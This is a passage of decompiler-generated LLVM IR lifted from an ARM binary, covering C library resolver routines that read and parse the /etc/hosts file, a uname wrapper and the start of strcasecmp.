  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e14c = load i32, i32* @r4, align 4
  store i32 %v3_1e14c, i32* %stack_var_-16, align 4
  %v9_1e14c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1e154 = load i32, i32* %arg1, align 4
  store i32 %v2_1e154, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1e160 = inttoptr i32 %v2_1e154 to i8*
  %v2_1e160 = call i32 @__encode_dotted(i8* %v1_1e160)
  store i32 %v2_1e160, i32* %r0.global-to-local, align 4
  %v1_1e164 = icmp slt i32 %v2_1e160, 0
  br i1 %v1_1e164, label %bb, label %bb7

bb:                                               ; preds = %entry
  %v5_1e168 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1e168, i32* @r4, align 4
  store i32 %v9_1e14c, i32* @r6, align 4
  ret i32 %v2_1e160

bb7:                                              ; preds = %entry
  %v1_1e16c = load i32, i32* @r5, align 4
  %v2_1e16c = sub i32 %v1_1e16c, %v2_1e160
  %v7_1e174 = icmp slt i32 %v2_1e16c, 4
  br i1 %v7_1e174, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1e178 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1e178, i32* @r4, align 4
  store i32 %v9_1e14c, i32* @r6, align 4
  ret i32 -1

bb9:                                              ; preds = %bb7
  %v0_1e17c = load i32, i32* @r4, align 4
  %v1_1e17c = add i32 %v0_1e17c, 6
  %v2_1e17c = inttoptr i32 %v1_1e17c to i8*
  %v3_1e17c = load i8, i8* %v2_1e17c, align 1
  %v2_1e180 = load i32, i32* @r6, align 4
  %v4_1e180 = add i32 %v2_1e180, %v2_1e160
  %v5_1e180 = inttoptr i32 %v4_1e180 to i8*
  store i8 %v3_1e17c, i8* %v5_1e180, align 1
  %v0_1e184 = load i32, i32* @r4, align 4
  %v1_1e184 = add i32 %v0_1e184, 4
  %v2_1e184 = inttoptr i32 %v1_1e184 to i32*
  %v3_1e184 = load i32, i32* %v2_1e184, align 4
  %v0_1e188 = load i32, i32* @r6, align 4
  %v1_1e188 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e188 = add i32 %v1_1e188, %v0_1e188
  store i32 %v2_1e188, i32* %r2.global-to-local, align 4
  %v1_1e18c = trunc i32 %v3_1e184 to i8
  %v3_1e18c = add i32 %v2_1e188, 1
  %v4_1e18c = inttoptr i32 %v3_1e18c to i8*
  store i8 %v1_1e18c, i8* %v4_1e18c, align 1
  %v0_1e190 = load i32, i32* @r4, align 4
  %v1_1e190 = add i32 %v0_1e190, 10
  %v2_1e190 = inttoptr i32 %v1_1e190 to i8*
  %v3_1e190 = load i8, i8* %v2_1e190, align 1
  %v2_1e194 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e194 = add i32 %v2_1e194, 2
  %v4_1e194 = inttoptr i32 %v3_1e194 to i8*
  store i8 %v3_1e190, i8* %v4_1e194, align 1
  %v0_1e198 = load i32, i32* @r4, align 4
  %v1_1e198 = add i32 %v0_1e198, 8
  %v2_1e198 = inttoptr i32 %v1_1e198 to i32*
  %v3_1e198 = load i32, i32* %v2_1e198, align 4
  %v0_1e19c = load i32, i32* %r0.global-to-local, align 4
  %v1_1e19c = add i32 %v0_1e19c, 4
  store i32 %v1_1e19c, i32* %r0.global-to-local, align 4
  %v1_1e1a0 = trunc i32 %v3_1e198 to i8
  %v2_1e1a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e1a0 = add i32 %v2_1e1a0, 3
  %v4_1e1a0 = inttoptr i32 %v3_1e1a0 to i8*
  store i8 %v1_1e1a0, i8* %v4_1e1a0, align 1
  %v2_1e1a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e1a4, i32* @r4, align 4
  store i32 %v9_1e14c, i32* @r6, align 4
  ret i32 %v1_1e19c

; uselistorder directives
  uselistorder i32 %v2_1e160, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1e14c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v2_1e1ac = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_257a4.1774 to i32))
  %v0_1e1b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e1b0, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_1e1b0 = load i32, i32* @r2, align 4
  %v2_1e1b0 = load i32, i32* @r4, align 4
  %v5_1e1b0 = udiv i32 %v2_1e1b0, 32768
  %v6_1e1b0 = and i32 %v5_1e1b0, %v1_1e1b0
  store i32 %v6_1e1b0, i32* @r5, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v2_1e1ac

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 2, 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_1e1b4 = load i32, i32* @r4, align 4
  %v6_1e1b4 = load i32, i32* @r5, align 4
  %v9_1e1b4 = load i32, i32* @r6, align 4
  %v12_1e1b4 = load i32, i32* @r7, align 4
  %v15_1e1b4 = load i32, i32* @r8, align 4
  %v18_1e1b4 = load i32, i32* @sb, align 4
  %v21_1e1b4 = load i32, i32* @sl, align 4
  %v24_1e1b4 = load i32, i32* @fp, align 4
  store i32 %tmp8, i32* @r4, align 4
  store i32 %tmp7, i32* @r5, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 -1, i32* @ip, align 4
  %v2_1e1d4 = inttoptr i32 %tmp7 to i32*
  store i32 -1, i32* %v2_1e1d4, align 4
  %v0_1e1d8 = load i32, i32* @r0, align 4
  store i32 %v0_1e1d8, i32* @r6, align 4
  %v0_1e1dc = load i32, i32* @r1, align 4
  %v0_1e1e0 = load i32, i32* @r2, align 4
  store i32 %v0_1e1e0, i32* @r8, align 4
  %v0_1e1e4 = load i32, i32* @r3, align 4
  store i32 %v0_1e1e4, i32* @fp, align 4
  %v3_1e1e8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e1e8, i32* @r7, align 4
  %tmp29 = icmp ult i32 %tmp8, 129
  br i1 %tmp29, label %.thread, label %dec_label_pc_1e1f4

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1e380

dec_label_pc_1e1f4:                               ; preds = %entry
  %v2_1e1f4 = icmp eq i32 %v0_1e1d8, 0
  br i1 %v2_1e1f4, label %dec_label_pc_1e1fc, label %dec_label_pc_1e21c

dec_label_pc_1e1fc:                               ; preds = %dec_label_pc_1e1f4
  %v0_1e1fc = call i32 @__open_etc_hosts()
  store i32 %v0_1e1fc, i32* @r6, align 4
  %v2_1e200 = icmp eq i32 %v0_1e1fc, 0
  br i1 %v2_1e200, label %dec_label_pc_1e208, label %dec_label_pc_1e21c

dec_label_pc_1e208:                               ; preds = %dec_label_pc_1e1fc
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_1e20c = inttoptr i32 %tmp5 to i32*
  store i32 0, i32* %v2_1e20c, align 4
  %v0_1e210 = call i32 @__GI___errno_location()
  %v1_1e214 = inttoptr i32 %v0_1e210 to i32*
  %v2_1e214 = load i32, i32* %v1_1e214, align 4
  store i32 %v2_1e214, i32* @sb, align 4
  br label %dec_label_pc_1e380

dec_label_pc_1e21c:                               ; preds = %dec_label_pc_1e1fc, %dec_label_pc_1e1f4
  %v1_1e240 = phi i32 [ %v0_1e1fc, %dec_label_pc_1e1fc ], [ %v0_1e1d8, %dec_label_pc_1e1f4 ]
  %v1_1e220 = add i32 %tmp, 24
  store i32 %v1_1e220, i32* %stack_var_-48, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1e230 = load i32, i32* @r4, align 4
  %v1_1e230 = add i32 %v0_1e230, -48
  store i32 %v1_1e230, i32* %r1.global-to-local, align 4
  %v1_1e234 = add i32 %tmp, 32
  store i32 %v1_1e234, i32* @sl, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  store i32 1, i32* @sb, align 4
  %v2_1e240 = add i32 %v1_1e240, 8
  %v3_1e240 = inttoptr i32 %v2_1e240 to i32*
  store i32 48, i32* %v3_1e240, align 4
  %v0_1e244 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e244 = load i32, i32* @r6, align 4
  %v2_1e244 = add i32 %v1_1e244, 16
  %v3_1e244 = inttoptr i32 %v2_1e244 to i32*
  store i32 %v0_1e244, i32* %v3_1e244, align 4
  %v0_1e248 = load i32, i32* %r3.global-to-local, align 4
  %v1_1e248 = load i32, i32* @r5, align 4
  %v2_1e248 = inttoptr i32 %v1_1e248 to i32*
  store i32 %v0_1e248, i32* %v2_1e248, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1e250 = load i32, i32* @r6, align 4
  %v2_1e250 = add i32 %v1_1e250, 4
  %v3_1e250 = inttoptr i32 %v2_1e250 to i32*
  store i32 %tmp, i32* %v3_1e250, align 4
  %v2_1e358 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1e280 = inttoptr i32 %v0_1e1dc to i8*
  br label %dec_label_pc_1e354

dec_label_pc_1e258:                               ; preds = %dec_label_pc_1e354
  %v3_1e258 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1e258, i32* %r1.global-to-local, align 4
  %v0_1e25c = load i32, i32* @fp, align 4
  %v7_1e25c = icmp eq i32 %v0_1e25c, 1
  %v1_1e260 = add i32 %v3_1e258, 4
  store i32 %v1_1e260, i32* @r5, align 4
  %v1_1e264 = load i32, i32* @r7, align 4
  %v2_1e264 = add i32 %v1_1e264, 4
  %v3_1e264 = inttoptr i32 %v2_1e264 to i32*
  store i32 %v1_1e260, i32* %v3_1e264, align 4
  br i1 %v7_1e25c, label %dec_label_pc_1e380, label %dec_label_pc_1e26c

dec_label_pc_1e26c:                               ; preds = %dec_label_pc_1e258
  %v0_1e26c = load i32, i32* @fp, align 4
  %v7_1e26c = icmp eq i32 %v0_1e26c, 2
  br i1 %v7_1e26c, label %dec_label_pc_1e278, label %dec_label_pc_1e29c.preheader

dec_label_pc_1e29c.preheader:                     ; preds = %dec_label_pc_1e26c
  %v1_1e270 = load i32, i32* @r5, align 4
  %v1_1e29c23 = inttoptr i32 %v1_1e270 to i32*
  %v2_1e29c24 = load i32, i32* %v1_1e29c23, align 4
  store i32 %v2_1e29c24, i32* %r3.global-to-local, align 4
  store i32 %v2_1e29c24, i32* %r1.global-to-local, align 4
  %v2_1e2a026 = icmp eq i32 %v2_1e29c24, 0
  %v1_1e2a827 = add i32 %v1_1e270, 4
  store i32 %v1_1e2a827, i32* @r4, align 4
  br i1 %v2_1e2a026, label %dec_label_pc_1e354, label %dec_label_pc_1e290

dec_label_pc_1e278:                               ; preds = %dec_label_pc_1e26c
  %v0_1e278 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e278 = inttoptr i32 %v0_1e278 to i32*
  %v2_1e278 = load i32, i32* %v1_1e278, align 4
  store i32 %v2_1e278, i32* @r1, align 4
  %v3_1e280 = call i32 @__GI_strcoll(i8* %v2_1e280, i32 %v2_1e278)
  %v2_1e284 = icmp eq i32 %v3_1e280, 0
  br i1 %v2_1e284, label %dec_label_pc_1e2b4, label %dec_label_pc_1e354

dec_label_pc_1e290:                               ; preds = %dec_label_pc_1e29c.preheader, %dec_label_pc_1e290.dec_label_pc_1e29c_crit_edge
  %v2_1e29c28 = phi i32 [ %v2_1e29c, %dec_label_pc_1e290.dec_label_pc_1e29c_crit_edge ], [ %v2_1e29c24, %dec_label_pc_1e29c.preheader ]
  %v3_1e290 = call i32 @__GI_strcasecmp(i8* %v2_1e280, i32 %v2_1e29c28)
  %v2_1e294 = icmp eq i32 %v3_1e290, 0
  br i1 %v2_1e294, label %dec_label_pc_1e2b4, label %dec_label_pc_1e290.dec_label_pc_1e29c_crit_edge

dec_label_pc_1e290.dec_label_pc_1e29c_crit_edge:  ; preds = %dec_label_pc_1e290
  %v0_1e29c.pre = load i32, i32* @r4, align 4
  %v1_1e29c = inttoptr i32 %v0_1e29c.pre to i32*
  %v2_1e29c = load i32, i32* %v1_1e29c, align 4
  store i32 %v2_1e29c, i32* %r3.global-to-local, align 4
  store i32 %v2_1e29c, i32* %r1.global-to-local, align 4
  %v2_1e2a0 = icmp eq i32 %v2_1e29c, 0
  %v1_1e2a8 = add i32 %v0_1e29c.pre, 4
  store i32 %v1_1e2a8, i32* @r4, align 4
  br i1 %v2_1e2a0, label %dec_label_pc_1e354, label %dec_label_pc_1e290

dec_label_pc_1e2b4:                               ; preds = %dec_label_pc_1e290, %dec_label_pc_1e278
  %v0_1e2b4 = load i32, i32* @r5, align 4
  %v1_1e2b4 = inttoptr i32 %v0_1e2b4 to i32*
  %v2_1e2b4 = load i32, i32* %v1_1e2b4, align 4
  %v4_1e2b4 = add i32 %v0_1e2b4, 4
  store i32 %v4_1e2b4, i32* @r5, align 4
  %v2_1e2b8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_1e2b8, i32* %r2.global-to-local, align 4
  %v1_1e2bc = load i32, i32* @r7, align 4
  %v2_1e2bc = inttoptr i32 %v1_1e2bc to i32*
  store i32 %v2_1e2b4, i32* %v2_1e2bc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1e2c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e2c4 = add i32 %v1_1e2c4, 4
  %v3_1e2c4 = inttoptr i32 %v2_1e2c4 to i32*
  store i32 0, i32* %v3_1e2c4, align 4
  %v0_1e2c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e2c8 = load i32, i32* @r7, align 4
  %v2_1e2c8 = add i32 %v1_1e2c8, 16
  %v3_1e2c8 = inttoptr i32 %v2_1e2c8 to i32*
  store i32 %v0_1e2c8, i32* %v3_1e2c8, align 4
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_1e2d0 = load i32, i32* @r8, align 4
  %v7_1e2d0 = icmp eq i32 %v0_1e2d0, 2
  %v0_1e2d4 = load i32, i32* @r5, align 4
  %v1_1e2d4 = load i32, i32* @r7, align 4
  %v2_1e2d4 = add i32 %v1_1e2d4, 4
  %v3_1e2d4 = inttoptr i32 %v2_1e2d4 to i32*
  store i32 %v0_1e2d4, i32* %v3_1e2d4, align 4
  %v0_1e2d8 = load i32, i32* @sl, align 4
  %v1_1e2d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e2d8 = add i32 %v1_1e2d8, 24
  %v3_1e2d8 = inttoptr i32 %v2_1e2d8 to i32*
  store i32 %v0_1e2d8, i32* %v3_1e2d8, align 4
  br i1 %v7_1e2d0, label %dec_label_pc_1e2e0, label %dec_label_pc_1e310

dec_label_pc_1e2e0:                               ; preds = %dec_label_pc_1e2b4
  %v3_1e2e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1e2e0, i32* %r3.global-to-local, align 4
  %v0_1e2e4 = load i32, i32* @r8, align 4
  %v1_1e2e8 = inttoptr i32 %v3_1e2e0 to i32*
  %v2_1e2e8 = load i32, i32* %v1_1e2e8, align 4
  store i32 %v2_1e2e8, i32* %r1.global-to-local, align 4
  %v0_1e2ec = load i32, i32* @sl, align 4
  store i32 %v0_1e2ec, i32* %r2.global-to-local, align 4
  %v3_1e2f0 = inttoptr i32 %v2_1e2e8 to i8*
  %v4_1e2f0 = call i32 @inet_pton(i32 %v0_1e2e4, i8* %v3_1e2f0, i32 %v0_1e2ec)
  %tmp21 = icmp slt i32 %v4_1e2f0, 1
  br i1 %tmp21, label %dec_label_pc_1e350, label %dec_label_pc_1e2fc

dec_label_pc_1e2fc:                               ; preds = %dec_label_pc_1e2e0
  %v0_1e300 = load i32, i32* @r7, align 4
  %v2_1e300 = inttoptr i32 %tmp5 to i32*
  store i32 %v0_1e300, i32* %v2_1e300, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1e308 = load i32, i32* @r8, align 4
  %v1_1e308 = load i32, i32* @r7, align 4
  %v2_1e308 = add i32 %v1_1e308, 8
  %v3_1e308 = inttoptr i32 %v2_1e308 to i32*
  store i32 %v0_1e308, i32* %v3_1e308, align 4
  %v0_1e348.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1e344

dec_label_pc_1e310:                               ; preds = %dec_label_pc_1e2b4
  %v0_1e310 = load i32, i32* @r8, align 4
  %v7_1e310 = icmp eq i32 %v0_1e310, 10
  br i1 %v7_1e310, label %dec_label_pc_1e318, label %dec_label_pc_1e350

dec_label_pc_1e318:                               ; preds = %dec_label_pc_1e310
  %v3_1e318 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1e318, i32* %r3.global-to-local, align 4
  %v1_1e320 = inttoptr i32 %v3_1e318 to i32*
  %v2_1e320 = load i32, i32* %v1_1e320, align 4
  store i32 %v2_1e320, i32* %r1.global-to-local, align 4
  %v0_1e324 = load i32, i32* @sl, align 4
  store i32 %v0_1e324, i32* %r2.global-to-local, align 4
  %v3_1e328 = inttoptr i32 %v2_1e320 to i8*
  %v4_1e328 = call i32 @inet_pton(i32 10, i8* %v3_1e328, i32 %v0_1e324)
  %tmp22 = icmp slt i32 %v4_1e328, 1
  br i1 %tmp22, label %dec_label_pc_1e350, label %dec_label_pc_1e334

dec_label_pc_1e334:                               ; preds = %dec_label_pc_1e318
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v0_1e338 = load i32, i32* @r8, align 4
  %v1_1e338 = load i32, i32* @r7, align 4
  %v2_1e338 = add i32 %v1_1e338, 8
  %v3_1e338 = inttoptr i32 %v2_1e338 to i32*
  store i32 %v0_1e338, i32* %v3_1e338, align 4
  %v0_1e33c = load i32, i32* @r7, align 4
  %v1_1e33c = load i32, i32* %r2.global-to-local, align 4
  %v2_1e33c = inttoptr i32 %v1_1e33c to i32*
  store i32 %v0_1e33c, i32* %v2_1e33c, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1e344

dec_label_pc_1e344:                               ; preds = %dec_label_pc_1e2fc, %dec_label_pc_1e334
  %v0_1e348 = phi i32 [ %v0_1e348.pre, %dec_label_pc_1e2fc ], [ 16, %dec_label_pc_1e334 ]
  store i32 0, i32* @sb, align 4
  %v1_1e348 = load i32, i32* @r7, align 4
  %v2_1e348 = add i32 %v1_1e348, 12
  %v3_1e348 = inttoptr i32 %v2_1e348 to i32*
  store i32 %v0_1e348, i32* %v3_1e348, align 4
  br label %dec_label_pc_1e378

dec_label_pc_1e350:                               ; preds = %dec_label_pc_1e310, %dec_label_pc_1e318, %dec_label_pc_1e2e0
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1e354

dec_label_pc_1e354:                               ; preds = %dec_label_pc_1e29c.preheader, %dec_label_pc_1e290.dec_label_pc_1e29c_crit_edge, %dec_label_pc_1e278, %dec_label_pc_1e350, %dec_label_pc_1e21c
  %v0_1e354 = load i32, i32* @r6, align 4
  store i32 %v2_1e358, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_257b0.1777 to i32), i32* %r3.global-to-local, align 4
  %v5_1e364 = inttoptr i32 %v0_1e354 to i32*
  %v6_1e364 = call i32 @__GI_config_read(i32* %v5_1e364, i32 %v2_1e358, i32 459270, i32 ptrtoint ([4 x i8]* @global_var_257b0.1777 to i32))
  %v2_1e368 = icmp eq i32 %v6_1e364, 0
  br i1 %v2_1e368, label %dec_label_pc_1e370, label %dec_label_pc_1e258

dec_label_pc_1e370:                               ; preds = %dec_label_pc_1e354
  %v0_1e370 = load i32, i32* @fp, align 4
  %v7_1e370 = icmp eq i32 %v0_1e370, 1
  br i1 %v7_1e370, label %dec_label_pc_1e380, label %dec_label_pc_1e378

dec_label_pc_1e378:                               ; preds = %dec_label_pc_1e370, %dec_label_pc_1e344
  %v0_1e378 = load i32, i32* @r6, align 4
  %v1_1e37c = inttoptr i32 %v0_1e378 to i32*
  %v2_1e37c = call i32 @__GI_config_close(i32* %v1_1e37c)
  br label %dec_label_pc_1e380

dec_label_pc_1e380:                               ; preds = %dec_label_pc_1e258, %.thread, %dec_label_pc_1e370, %dec_label_pc_1e208, %dec_label_pc_1e378
  %v0_1e380 = load i32, i32* @sb, align 4
  store i32 %v3_1e1b4, i32* @r4, align 4
  store i32 %v6_1e1b4, i32* @r5, align 4
  store i32 %v9_1e1b4, i32* @r6, align 4
  store i32 %v12_1e1b4, i32* @r7, align 4
  store i32 %v15_1e1b4, i32* @r8, align 4
  store i32 %v18_1e1b4, i32* @sb, align 4
  store i32 %v21_1e1b4, i32* @sl, align 4
  store i32 %v24_1e1b4, i32* @fp, align 4
  ret i32 %v0_1e380

; uselistorder directives
  uselistorder i32 %v2_1e29c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1e29c.pre, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp5, { 3, 2, 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7, 8 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 37, 39, 40, 41, 12, 47, 48, 49, 30, 32, 13, 31, 4, 51, 50, 42, 14, 52, 15, 53, 16, 54, 55, 1, 45, 46, 56, 17, 57, 18, 19, 20, 38, 8, 0, 43, 44, 21, 59, 58, 22, 24, 23, 33, 34, 7, 11, 10, 6, 9, 2, 35, 36, 25, 5, 27, 28, 26, 29, 60 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 20, 21, 22, 23, 24, 25, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 48, { 3, 17, 22, 10, 4, 18, 19, 11, 12, 13, 14, 0, 21, 23, 24, 25, 26, 1, 5, 27, 6, 28, 20, 7, 30, 31, 32, 29, 15, 16, 8, 9, 2 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 24, { 26, 30, 32, 33, 0, 44, 45, 34, 35, 11, 12, 13, 14, 36, 37, 31, 46, 1, 41, 38, 39, 40, 27, 28, 47, 42, 10, 29, 15, 16, 17, 2, 48, 49, 50, 51, 52, 53, 54, 18, 43, 19, 20, 21, 22, 23, 24, 7, 8, 6, 9, 3, 4, 5, 25 }
  uselistorder i32 34, { 10, 11, 12, 13, 7, 8, 14, 2, 3, 0, 5, 16, 4, 17, 15, 1, 6, 9 }
  uselistorder i32* @fp, { 69, 70, 71, 72, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 0, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 3, 4, 91, 92, 93, 94, 105, 106, 107, 1, 108, 109, 110, 111, 112, 73, 74, 75, 76, 77, 78, 79, 80, 2, 129, 131, 130, 132, 113, 114, 115, 116, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 133, 134, 135, 136, 137, 138, 145, 144, 139, 140, 141, 142, 143 }
  uselistorder i32* @sl, { 12, 13, 14, 15, 21, 22, 23, 24, 25, 26, 27, 28, 29, 40, 30, 31, 32, 33, 41, 42, 43, 44, 0, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 6, 7, 34, 35, 36, 37, 38, 39, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 16, 17, 18, 19, 20, 94, 95, 79, 80, 81, 3, 82, 83, 84, 85, 86, 87, 88, 4, 89, 5, 90, 91, 92, 93, 75, 76, 77, 78, 65, 66, 67, 68, 69, 70, 71, 72, 73, 1, 74, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_1e380, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1e354, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1e350, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e344, { 1, 0 }
  uselistorder label %dec_label_pc_1e290, { 1, 0 }
}

define i32 @"$d"(i16* %arg1) local_unnamed_addr {
dec_label_pc_1e38c:
  %v0_1e38c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e38c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e38c
  %v1_1e38c = load i32, i32* @r7, align 4
  %v2_1e38c = load i32, i32* @r6, align 4
  %v5_1e38c = mul i32 %v2_1e38c, 16
  %v6_1e38c = and i32 %v5_1e38c, %v1_1e38c
  %v1_1e390 = load i32, i32* @r5, align 4
  %v2_1e390 = trunc i32 %v1_1e390 to i16
  store i16 %v2_1e390, i16* %arg1, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e38c, %bb
  %.01 = phi i32 [ %v6_1e38c, %bb ], [ undef, %dec_label_pc_1e38c ]
  ret i32 %.01

; uselistorder directives
  uselistorder i32* @r7, { 8, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 78, 79, 80, 81, 82, 12, 13, 14, 15, 0, 16, 2, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 69, 70, 71, 72, 73, 74, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 75, 4, 76, 77, 105, 106, 64, 65, 66, 67, 68, 43, 5, 44, 45, 46, 47, 48, 49, 17, 18, 19, 9, 20, 21, 3, 22, 132, 6, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 154, 7, 156, 150, 151, 152, 153, 155, 157, 130, 131, 107, 108, 109, 110, 111, 112, 113, 114, 115, 120, 121, 122, 123, 124, 1, 125, 126, 127, 10, 11, 116, 117, 118, 119, 128, 129, 29, 30, 31, 32, 23, 24, 25, 26, 27, 28 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @uname() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1e394 = load i32, i32* @r4, align 4
  store i32 %v3_1e394, i32* %stack_var_-8, align 4
  %v0_1e398 = call i32 @uname()
  store i32 %v0_1e398, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1e398, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_1e3a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_1e3a8, i32* %r4.global-to-local, align 4
  ret i32 %v0_1e398

bb3:                                              ; preds = %entry
  %v0_1e3ac = call i32 @__GI___errno_location()
  %v0_1e3b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e3b0 = sub i32 0, %v0_1e3b0
  %v2_1e3b4 = inttoptr i32 %v0_1e3ac to i32*
  store i32 %v1_1e3b0, i32* %v2_1e3b4, align 4
  %v2_1e3bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1e3bc, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1e398, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___errno_location, { 53, 52, 50, 49, 48, 47, 46, 85, 84, 83, 36, 41, 35, 34, 82, 81, 43, 78, 19, 42, 51, 33, 32, 40, 39, 31, 80, 79, 77, 76, 75, 74, 5, 59, 18, 9, 73, 8, 24, 7, 17, 16, 87, 15, 45, 44, 72, 71, 70, 14, 13, 58, 23, 37, 60, 57, 12, 27, 55, 64, 38, 30, 29, 28, 2, 22, 4, 0, 68, 11, 69, 1, 6, 25, 67, 26, 65, 56, 66, 21, 3, 20, 63, 62, 61, 86, 54, 10 }
  uselistorder i32 ()* @uname, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_1e3d4

dec_label_pc_1e3d4:                               ; preds = %dec_label_pc_1e3d4._crit_edge, %entry
  %v11_1e4343 = phi i32 [ %v11_1e434, %dec_label_pc_1e3d4._crit_edge ], [ 0, %entry ]
